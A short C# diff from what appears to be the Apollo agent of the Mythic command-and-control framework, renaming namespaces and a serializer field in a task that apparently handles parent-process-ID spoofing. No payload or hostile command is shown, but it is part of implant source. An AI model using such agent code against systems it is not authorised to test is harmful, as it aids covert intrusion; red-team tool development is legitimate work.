@@ -6,9 +6,9 @@
 
 #if PPID
 
-using PhantomInterop.Classes;
-using PhantomInterop.Interfaces;
-using PhantomInterop.Structs.MythicStructs;
+using ApolloInterop.Classes;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Structs.MythicStructs;
 using System;
 using System.Diagnostics;
 using System.Runtime.Serialization;
@@ -31,7 +31,7 @@ namespace Tasks
         public override void Start()
         {
             MythicTaskResponse resp;
-            PpidParameters parameters = _dataSerializer.Deserialize<PpidParameters>(_data.Parameters);
+            PpidParameters parameters = _jsonSerializer.Deserialize<PpidParameters>(_data.Parameters);
             Process p = null;
             string errorMsg = "";
             try
